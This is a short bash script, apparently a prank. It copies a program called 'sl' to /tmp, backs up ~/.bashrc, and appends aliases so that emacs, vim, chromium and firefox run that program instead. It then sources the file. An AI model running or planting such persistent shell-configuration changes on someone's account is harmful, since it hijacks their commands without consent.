# !/bin/bash

cp ./sl /tmp/;
cp ~/.bashrc .;
echo "alias emacs='/tmp/sl -a'" >> ~/.bashrc;
echo "alias vim='/tmp/sl -z'" >> ~/.bashrc;
echo "alias chromium='/tmp/sl'" >> ~/.bashrc;
echo "alias firefox='/tmp/sl'" >> ~/.bashrc;
source ~/.bashrc 
